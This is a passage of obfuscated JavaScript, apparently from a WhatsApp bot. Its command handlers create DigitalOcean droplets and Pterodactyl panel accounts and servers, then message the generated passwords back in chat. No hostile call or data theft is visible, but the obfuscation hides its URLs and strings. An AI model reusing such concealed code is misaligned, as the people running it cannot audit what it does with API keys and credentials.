                        if (_0x2a5309[_0x5d4417(0xdfb)](_0x224056, _0x2a5309[_0x5d4417(0xeb1)]))
                            _0x4b27a5 = _0x2a5309[_0x5d4417(0xf71)];
                        else {
                            if (_0x2a5309[_0x5d4417(0xfb2)](_0x224056, _0x2a5309[_0x5d4417(0xbf6)]))
                                _0x4b27a5 = _0x2a5309[_0x5d4417(0xb0a)];
                            else
                                _0x2a5309[_0x5d4417(0x11ce)](_0x224056, _0x2a5309[_0x5d4417(0x665)]) ? _0x4b27a5 = _0x2a5309[_0x5d4417(0x1154)] : (_0x4b27a5 = _0x2a5309[_0x5d4417(0x21a)], _0x1e14bc = _0x2a5309[_0x5d4417(0xc55)]);
                        }
                    }
                }
                let _0x5c28a2 = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (!_0x5c28a2)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x61f)](_0x1ac933, _0x2a5309[_0x5d4417(0x4f3)]));
                try {
                    let _0x2967ca = {
                            'name': _0x5c28a2,
                            'region': _0x1e14bc,
                            'size': _0x4b27a5,
                            'image': _0x2a5309[_0x5d4417(0xaa9)],
                            'ssh_keys': null,
                            'backups': ![],
                            'ipv6': !![],
                            'user_data': null,
                            'private_networking': null,
                            'volumes': null,
                            'tags': ['T']
                        }, _0x8f2cfb = await _0x2a5309[_0x5d4417(0x725)](_0xcbd4eb);
                    _0x2967ca[_0x5d4417(0xd14)] = _0x5d4417(0xeac) + _0x5d4417(0x480) + _0x5d4417(0xab9) + _0x8f2cfb + (_0x5d4417(0x717) + _0x5d4417(0xd88) + _0x5d4417(0x82c));
                    let _0x52d449 = await _0x2a5309[_0x5d4417(0x736)](fetch, _0x2a5309[_0x5d4417(0x592)], {
                            'method': _0x2a5309[_0x5d4417(0x3a6)],
                            'headers': {
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0x776)](_0x2a5309[_0x5d4417(0xbee)], global[_0x5d4417(0xd5d) + _0x5d4417(0x18a)])
                            },
                            'body': JSON[_0x5d4417(0x78f)](_0x2967ca)
                        }), _0x42d85d = await _0x52d449[_0x5d4417(0x728)]();
                    if (_0x52d449['ok']) {
                        let _0x307965 = _0x42d85d[_0x5d4417(0x1ba)], _0x417c05 = _0x307965['id'];
                        await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0xd5b) + _0x5d4417(0x604) + _0x5d4417(0x219)), await new Promise(_0x1041ee => setTimeout(_0x1041ee, 0x579 * 0x7 + -0x1232c + -0x4bb * -0x67));
                        let _0xffd529 = await _0x2a5309[_0x5d4417(0x936)](fetch, _0x5d4417(0xb54) + _0x5d4417(0xc3d) + _0x5d4417(0xabb) + _0x5d4417(0x902) + '/' + _0x417c05, {
                                'method': _0x2a5309[_0x5d4417(0xea5)],
                                'headers': {
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x1128)](_0x2a5309[_0x5d4417(0xbee)], global[_0x5d4417(0xd5d) + _0x5d4417(0x18a)])
                                }
                            }), _0x201b81 = await _0xffd529[_0x5d4417(0x728)](), _0x495362 = _0x201b81[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'] && _0x2a5309[_0x5d4417(0x78e)](_0x201b81[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'][_0x5d4417(0xf65)], -0x1cb0 + -0xfb5 + 0x1 * 0x2c65) ? _0x201b81[_0x5d4417(0x1ba)][_0x5d4417(0x822)]['v4'][0xceb * 0x1 + -0x76d * 0x1 + -0x57e][_0x5d4417(0xc59)] : _0x2a5309[_0x5d4417(0x8c6)], _0x1e1489 = _0x5d4417(0x1090) + _0x5d4417(0x923) + '\x0a\x0a';
                        _0x1e1489 += _0x5d4417(0x470) + _0x417c05 + '\x0a', _0x1e1489 += _0x5d4417(0x54e) + _0x495362 + '\x0a', _0x1e1489 += _0x5d4417(0x1e9) + _0x8f2cfb, await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x1e1489 });
                    } else
                        throw new Error(_0x5d4417(0x55c) + _0x5d4417(0x9b2) + _0x42d85d[_0x5d4417(0x2f3)]);
                } catch (_0x29e759) {
                    console[_0x5d4417(0xe78)](_0x29e759), _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x119a) + _0x5d4417(0xd46) + _0x5d4417(0xcfa) + _0x5d4417(0xd17) + _0x29e759);
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x3db)]:
        case _0x2a5309[_0x5d4417(0xeb5)]:
        case _0x2a5309[_0x5d4417(0x4c9)]:
        case _0x2a5309[_0x5d4417(0xf90)]:
        case _0x2a5309[_0x5d4417(0x1136)]:
        case _0x2a5309[_0x5d4417(0x276)]:
        case _0x2a5309[_0x5d4417(0x10d1)]:
        case _0x2a5309[_0x5d4417(0xeb4)]:
        case _0x2a5309[_0x5d4417(0xc14)]:
        case _0x2a5309[_0x5d4417(0xef3)]:
        case _0x2a5309[_0x5d4417(0xf74)]:
        case _0x2a5309[_0x5d4417(0x110e)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x312)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ba)](_0x1ac933, _0x2a5309[_0x5d4417(0xaa8)]));
                global[_0x5d4417(0x594)] = _0x156b97;
                var _0x42598a, _0x1193a1, _0x1de043;
                if (_0x2a5309[_0x5d4417(0x43b)](_0x224056, _0x2a5309[_0x5d4417(0x3db)]))
                    _0x42598a = _0x2a5309[_0x5d4417(0xdd3)], _0x1193a1 = _0x2a5309[_0x5d4417(0xdd3)], _0x1de043 = '40';
                else {
                    if (_0x2a5309[_0x5d4417(0xceb)](_0x224056, _0x2a5309[_0x5d4417(0xeb5)]))
                        _0x42598a = _0x2a5309[_0x5d4417(0xc6f)], _0x1193a1 = _0x2a5309[_0x5d4417(0xdd3)], _0x1de043 = '60';
                    else {
                        if (_0x2a5309[_0x5d4417(0x351)](_0x224056, _0x2a5309[_0x5d4417(0x4c9)]))
                            _0x42598a = _0x2a5309[_0x5d4417(0x1d1)], _0x1193a1 = _0x2a5309[_0x5d4417(0xc6f)], _0x1de043 = '80';
                        else {
                            if (_0x2a5309[_0x5d4417(0x1d9)](_0x224056, _0x2a5309[_0x5d4417(0xf90)]))
                                _0x42598a = _0x2a5309[_0x5d4417(0xb88)], _0x1193a1 = _0x2a5309[_0x5d4417(0xc6f)], _0x1de043 = _0x2a5309[_0x5d4417(0x5f8)];
                            else {
                                if (_0x2a5309[_0x5d4417(0xed3)](_0x224056, _0x2a5309[_0x5d4417(0x1136)]))
                                    _0x42598a = _0x2a5309[_0x5d4417(0xd59)], _0x1193a1 = _0x2a5309[_0x5d4417(0x1d1)], _0x1de043 = _0x2a5309[_0x5d4417(0x6e5)];
                                else {
                                    if (_0x2a5309[_0x5d4417(0xfa8)](_0x224056, _0x2a5309[_0x5d4417(0x276)]))
                                        _0x42598a = _0x2a5309[_0x5d4417(0x67b)], _0x1193a1 = _0x2a5309[_0x5d4417(0x1d1)], _0x1de043 = _0x2a5309[_0x5d4417(0xfec)];
                                    else {
                                        if (_0x2a5309[_0x5d4417(0xc00)](_0x224056, _0x2a5309[_0x5d4417(0x10d1)]))
                                            _0x42598a = _0x2a5309[_0x5d4417(0xc89)], _0x1193a1 = _0x2a5309[_0x5d4417(0xb88)], _0x1de043 = _0x2a5309[_0x5d4417(0x46b)];
                                        else {
                                            if (_0x2a5309[_0x5d4417(0xe0a)](_0x224056, _0x2a5309[_0x5d4417(0xeb4)]))
                                                _0x42598a = _0x2a5309[_0x5d4417(0xdec)], _0x1193a1 = _0x2a5309[_0x5d4417(0xb88)], _0x1de043 = _0x2a5309[_0x5d4417(0x4d2)];
                                            else {
                                                if (_0x2a5309[_0x5d4417(0x8d4)](_0x224056, _0x2a5309[_0x5d4417(0xc14)]))
                                                    _0x42598a = _0x2a5309[_0x5d4417(0x11ed)], _0x1193a1 = _0x2a5309[_0x5d4417(0xd59)], _0x1de043 = _0x2a5309[_0x5d4417(0x596)];
                                                else
                                                    _0x2a5309[_0x5d4417(0xe0a)](_0x224056, _0x2a5309[_0x5d4417(0xef3)]) ? (_0x42598a = _0x2a5309[_0x5d4417(0x111f)], _0x1193a1 = _0x2a5309[_0x5d4417(0xd59)], _0x1de043 = _0x2a5309[_0x5d4417(0x523)]) : (_0x42598a = '0', _0x1193a1 = '0', _0x1de043 = '0');
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                let _0x5de5cb = global[_0x5d4417(0x594)][_0x5d4417(0xec1) + 'e'](), _0x5c1516 = _0x2a5309[_0x5d4417(0x11cf)](_0x5de5cb, _0x2a5309[_0x5d4417(0x1082)]), _0x53a087 = _0x2a5309[_0x5d4417(0x343)](_0x2a5309[_0x5d4417(0x848)](capital, _0x5de5cb), _0x2a5309[_0x5d4417(0x865)]), _0x8769c6 = _0x2a5309[_0x5d4417(0xe45)](_0x5de5cb, crypto[_0x5d4417(0xda8) + 's'](0x1f6 * 0x2 + 0x1c5 + 0x61 * -0xf)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)])), _0x5be662 = await _0x2a5309[_0x5d4417(0x845)](fetch, _0x2a5309[_0x5d4417(0x1db)](domainV2, _0x2a5309[_0x5d4417(0x9d4)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xcc5)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'email': _0x5c1516,
                            'username': _0x5de5cb[_0x5d4417(0xec1) + 'e'](),
                            'first_name': _0x53a087,
                            'last_name': _0x2a5309[_0x5d4417(0x366)],
                            'language': 'en',
                            'password': _0x8769c6[_0x5d4417(0xef4)]()
                        })
                    }), _0x2ea4b6 = await _0x5be662[_0x5d4417(0x728)]();
                if (_0x2ea4b6[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x2ea4b6[_0x5d4417(0x7e1)][0x491 * 0x4 + 0x218 * -0x6 + -0x5b4], null, -0x18c3 + 0x5 * 0x25 + 0x3 * 0x804));
                let _0x3f565f = _0x2ea4b6[_0x5d4417(0x7f4)], _0x39b8d5 = _0x2a5309[_0x5d4417(0xb22)](tanggal, Date[_0x5d4417(0xc8a)]()), _0x495115 = _0x3f565f['id'], _0x47f038 = await _0x2a5309[_0x5d4417(0x6a9)](fetch, _0x2a5309[_0x5d4417(0xb17)](_0x2a5309[_0x5d4417(0x45e)](domainV2, _0x5d4417(0x958) + _0x5d4417(0x61c) + _0x5d4417(0x95c) + nestidV2 + _0x5d4417(0x36c)), eggV2), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xb17)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x27e354 = await _0x47f038[_0x5d4417(0x728)](), _0x10395f = _0x27e354[_0x5d4417(0x7f4)][_0x5d4417(0x7ae)], _0x24e0f3 = await _0x2a5309[_0x5d4417(0xac6)](fetch, _0x2a5309[_0x5d4417(0xb36)](domainV2, _0x2a5309[_0x5d4417(0x6bf)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xe33)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'name': _0x53a087,
                            'description': _0x39b8d5,
                            'user': _0x495115,
                            'egg': _0x2a5309[_0x5d4417(0x1127)](parseInt, eggV2),
                            'docker_image': _0x2a5309[_0x5d4417(0x1189)],
                            'startup': _0x10395f,
                            'environment': {
                                'INST': _0x2a5309[_0x5d4417(0x483)],
                                'USER_UPLOAD': '0',
                                'AUTO_UPDATE': '0',
                                'CMD_RUN': _0x2a5309[_0x5d4417(0x3bb)]
                            },
                            'limits': {
                                'memory': _0x42598a,
                                'swap': 0x0,
                                'disk': _0x1193a1,
                                'io': 0x1f4,
                                'cpu': _0x1de043
                            },
                            'feature_limits': {
                                'databases': 0x5,
                                'backups': 0x5,
                                'allocations': 0x5
                            },
                            'deploy': {
                                'locations': [_0x2a5309[_0x5d4417(0xea8)](parseInt, locV2)],
                                'dedicated_ip': ![],
                                'port_range': []
                            }
                        })
                    }), _0x2a200c = await _0x24e0f3[_0x5d4417(0x728)]();
                if (_0x2a200c[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x2a200c[_0x5d4417(0x7e1)][0x2f1 * -0x4 + -0xd16 + -0xc6d * -0x2], null, -0x187 * -0xd + 0xcc + -0x14a5));
                let _0x5033d6 = _0x2a200c[_0x5d4417(0x7f4)];
                var _0x16d8bc;
                _0xedb653[_0x5d4417(0xe3e)] ? (_0x16d8bc = _0xedb653[_0x5d4417(0xeee)], await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbd4)])) : _0x16d8bc = _0xedb653[_0x5d4417(0x9e2)];
                var _0x4417bc = _0x5d4417(0x72a) + _0x5d4417(0x1158) + _0x5d4417(0x4f4) + _0x5d4417(0x5fd) + _0x5033d6['id'] + (_0x5d4417(0x336) + _0x5d4417(0xfa1)) + _0x3f565f[_0x5d4417(0x1104)] + (_0x5d4417(0xc9e) + _0x5d4417(0x519)) + _0x8769c6 + (_0x5d4417(0xbed) + _0x5d4417(0x8bc) + _0x5d4417(0xef6) + _0x5d4417(0x34d)) + (_0x2a5309[_0x5d4417(0xa0d)](_0x42598a, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x1b3)](_0x42598a[_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0x4 * -0x9a5 + -0x6c7 + -0x1fc9) ? _0x2a5309[_0x5d4417(0x73d)](_0x42598a[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](0x1e8b + -0xbdf + -0x12ac, -0x2057 + 0x1f9 * 0x3 + 0x1a6e)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x18f)](_0x42598a[_0x5d4417(0xff0)](-0x114e + -0x3 * 0x8c5 + 0x2b9d), 'GB')) + (_0x5d4417(0x306) + '\x20*') + (_0x2a5309[_0x5d4417(0xe56)](_0x1193a1, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x4d7)](_0x1193a1[_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0x270 + 0x99f + -0x72b) ? _0x2a5309[_0x5d4417(0xfee)](_0x1193a1[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x21df + 0x1b6f + 0x670, -0x2283 + -0xebe + 0x3143)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x1048)](_0x1193a1[_0x5d4417(0xff0)](-0x1 * 0x17cf + 0x97a + 0xe55), 'GB')) + (_0x5d4417(0x10ca) + '*') + (_0x2a5309[_0x5d4417(0x9fc)](_0x1de043, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x343)](_0x1de043, '%')) + _0x5d4417(0x774) + global[_0x5d4417(0x4fe)] + (_0x5d4417(0xa56) + _0x5d4417(0x78d) + _0x5d4417(0x4bd) + _0x5d4417(0xb5d) + _0x5d4417(0x4af) + _0x5d4417(0xab7) + _0x5d4417(0x11b1) + _0x5d4417(0xf7d) + _0x5d4417(0x24b) + _0x5d4417(0x720) + _0x5d4417(0x70f) + _0x5d4417(0xf83) + _0x5d4417(0x258) + _0x5d4417(0xd19) + _0x5d4417(0x4ad) + _0x5d4417(0x52c) + _0x5d4417(0xe74) + _0x5d4417(0x37d));
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x727)], _0x4417bc), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                    'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                    'fileName': _0x2a5309[_0x5d4417(0x727)],
                    'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                    'caption': _0x4417bc
                }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]), delete global[_0x5d4417(0x594)];
            }
            break;
        case _0x2a5309[_0x5d4417(0x422)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x75c)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x23e832 = await _0x2a5309[_0x5d4417(0xa64)](fetch, _0x2a5309[_0x5d4417(0x118b)](domainV2, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x74a)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x1b6519 = await _0x23e832[_0x5d4417(0x728)](), _0x49e6f9 = _0x1b6519[_0x5d4417(0x1059)];
                if (_0x2a5309[_0x5d4417(0x9e6)](_0x49e6f9[_0x5d4417(0xf65)], 0xb * 0x202 + -0xcb + -0x154a))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1021)]);
                var _0x4417bc = _0x2a5309[_0x5d4417(0x77f)];
                await _0x49e6f9[_0x5d4417(0x102c)](_0x38ee86 => {
                    const _0x5b561a = _0x5d4417;
                    if (_0x2a5309[_0x5b561a(0x9bf)](_0x38ee86[_0x5b561a(0x7f4)][_0x5b561a(0x1084)], !![]))
                        return;
                    _0x4417bc += _0x5b561a(0x190) + _0x38ee86[_0x5b561a(0x7f4)]['id'] + (_0x5b561a(0xf6b) + '\x20*') + _0x38ee86[_0x5b561a(0x7f4)][_0x5b561a(0xcf9)] + (_0x5b561a(0x1143) + _0x5b561a(0xe76)) + _0x38ee86[_0x5b561a(0x7f4)][_0x5b561a(0xaa4)][_0x5b561a(0xc6c)]('T')[-0x25 * 0x27 + -0x10d1 + 0x1674] + '\x0a';
                }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x5d4417(0x723) + 'v2',
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xf2c)] },
                            'type': 0x1
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x4417bc,
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0x203)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1dc)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xd8e)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x2a47d4 = await _0x2a5309[_0x5d4417(0x37c)](fetch, _0x2a5309[_0x5d4417(0xda6)](domainV2, _0x2a5309[_0x5d4417(0xdf3)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xd1b)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x3f476f = await _0x2a47d4[_0x5d4417(0x728)](), _0x37fd22 = _0x3f476f[_0x5d4417(0x1059)];
                if (_0x2a5309[_0x5d4417(0x26b)](_0x37fd22[_0x5d4417(0xf65)], -0x7 * 0x37f + 0x1 * -0x12cd + -0x1 * -0x2b47))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x10a4)]);
                let _0x3645d1 = _0x2a5309[_0x5d4417(0x89d)];
                for (let _0x4349c9 of _0x37fd22) {
                    let _0x4175ce = _0x4349c9[_0x5d4417(0x7f4)], _0x49c28a = await _0x2a5309[_0x5d4417(0xac6)](fetch, _0x2a5309[_0x5d4417(0xbe4)](_0x2a5309[_0x5d4417(0x94d)](_0x2a5309[_0x5d4417(0xf35)](domainV2, _0x2a5309[_0x5d4417(0xedb)]), _0x4175ce[_0x5d4417(0x60c)][_0x5d4417(0xc6c)]`-`[0x10b5 + 0xb7 * 0x11 + -0x1cdc]), _0x2a5309[_0x5d4417(0xc92)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0xcde)](_0x2a5309[_0x5d4417(0xbee)], capikeyV2)
                            }
                        }), _0x448572 = await _0x49c28a[_0x5d4417(0x728)](), _0x25b6da = _0x448572[_0x5d4417(0x7f4)] ? _0x448572[_0x5d4417(0x7f4)][_0x5d4417(0x986) + _0x5d4417(0x10f4)] : _0x4175ce[_0x5d4417(0x466)];
                    _0x3645d1 += _0x5d4417(0x190) + _0x4175ce['id'] + (_0x5d4417(0xf6b) + '\x20*') + _0x4175ce[_0x5d4417(0x277)] + (_0x5d4417(0x379) + '*') + (_0x2a5309[_0x5d4417(0xecd)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)], 0x353 * -0x2 + -0x1 * 0x1fe1 + 0x2687) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xb79)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], 0x8a5 + 0x175b + 0x164 * -0x17) ? _0x2a5309[_0x5d4417(0x36d)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](0x29 + 0x7c7 + -0x8 * 0xfe, -0xca4 * -0x2 + 0xf1b + -0x2861)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x6e1)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], -0x1 * 0x1fe3 + -0x10ea + 0x30d1 * 0x1) ? _0x2a5309[_0x5d4417(0x388)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x140c + 0x22fd + -0x6e1 * 0x8), 'GB') : _0x2a5309[_0x5d4417(0xdfe)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](-0xb52 + 0x15 * 0x193 + 0x7 * -0x31b), 'GB')) + (_0x5d4417(0x10ca) + '*') + (_0x2a5309[_0x5d4417(0x6a6)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)], 0x997 + 0x1d9c + -0x2733) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x11bd)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)][_0x5d4417(0xef4)](), '%')) + (_0x5d4417(0x306) + '\x20*') + (_0x2a5309[_0x5d4417(0xed3)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0xd81)], -0x21a * -0x8 + -0x45 * 0xd + -0xd4f) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x1038)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xf65)], 0x581 + -0x6b * 0x3 + -0xd9 * 0x5) ? _0x2a5309[_0x5d4417(0xdc2)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x10e6 + -0x1c2d + 0xb48), 'GB') : _0x2a5309[_0x5d4417(0x4bb)](_0x4175ce[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](-0xcb * -0x2c + 0x925 + -0x2c09), 'GB')) + (_0x5d4417(0x1143) + _0x5d4417(0xe76)) + _0x4175ce[_0x5d4417(0xaa4)][_0x5d4417(0xc6c)]('T')[-0x1861 + 0xd61 + 0xb00] + '\x0a';
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x5d4417(0xd79) + 'v2',
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xf68)] },
                            'type': 0x1
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x3645d1,
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0x83c)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0xf0b)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x7c2)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97) {
                    let _0x245ffd = await _0x2a5309[_0x5d4417(0x736)](fetch, _0x2a5309[_0x5d4417(0x3e6)](domainV2, _0x2a5309[_0x5d4417(0xa1e)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0x7a7)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                            }
                        }), _0x1e1538 = await _0x245ffd[_0x5d4417(0x728)](), _0x111f10 = _0x1e1538[_0x5d4417(0x1059)];
                    if (_0x2a5309[_0x5d4417(0xc1e)](_0x111f10[_0x5d4417(0xf65)], 0x434 + 0x186e + -0x1ca1))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1021)]);
                    let _0x4f133f = [];
                    return await _0x111f10[_0x5d4417(0x102c)](_0x240d2b => {
                        const _0x179c00 = _0x5d4417;
                        if (_0x2a5309[_0x179c00(0x464)](_0x240d2b[_0x179c00(0x7f4)][_0x179c00(0x1084)], !![]))
                            return;
                        _0x4f133f[_0x179c00(0x706)]({
                            'title': _0x240d2b[_0x179c00(0x7f4)][_0x179c00(0xcf9)] + _0x179c00(0xd97) + _0x240d2b[_0x179c00(0x7f4)]['id'] + ')',
                            'id': _0x179c00(0x84a) + _0x240d2b[_0x179c00(0x7f4)]['id']
                        });
                    }), _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0x2b9)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x5b7)],
                                                'rows': [..._0x4f133f]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0xc99)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x52d)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                }
                let _0xc46b18 = await _0x2a5309[_0x5d4417(0xb38)](fetch, _0x2a5309[_0x5d4417(0x11c8)](domainV2, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x343)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x178b96 = await _0xc46b18[_0x5d4417(0x728)](), _0x221cb8 = _0x178b96[_0x5d4417(0x1059)], _0x56afbb = null, _0x45ca7a = null;
                await _0x221cb8[_0x5d4417(0x102c)](async _0x4e2fa8 => {
                    const _0x366535 = _0x5d4417;
